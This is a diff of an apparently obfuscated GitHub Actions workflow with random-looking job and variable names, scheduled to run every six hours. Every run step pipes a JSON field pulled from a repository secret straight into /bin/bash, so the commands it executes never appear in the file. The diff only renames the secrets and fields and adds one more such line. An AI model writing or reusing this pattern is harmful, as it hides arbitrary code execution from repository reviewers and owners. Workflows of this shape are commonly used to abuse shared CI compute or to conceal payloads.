@@ -2,20 +2,22 @@ name: huaizhongjiechu
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 0/6 * * *'
-jobs:  # 14401
+    - cron: '45 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: huaizhongjiechu
         env:
-          osle040: ${{ secrets.osle040 }}
+          ia62: ${{ secrets.ia62 }}
         run: |
-          echo $osle040 | jq -r .ctvw6 | /bin/bash
-          echo $tg44491 | jq -r .dpmjx14 | /bin/bash
-          echo $fqhsb6077 | jq -r .bfok70909 | /bin/bash
-          echo $lbl18 | jq -r .c74 | /bin/bash
-          echo $hi999 | jq -r .tkpsq102 | /bin/bash
-          echo $dnqk82618 | jq -r .vm63223 | /bin/bash
+          echo $ia62 | jq -r .mwo6775 | /bin/bash
+          echo $tuqg602 | jq -r .gtuub01 | /bin/bash
+          echo $qcu47645 | jq -r .oooc1429 | /bin/bash
+          echo $iudu6792 | jq -r .rs487 | /bin/bash
+          echo $pcgj96 | jq -r .sfwl650 | /bin/bash
+          echo $ddf08185 | jq -r .o74 | /bin/bash
+          echo $s8913 | jq -r .ew5597 | /bin/bash
 
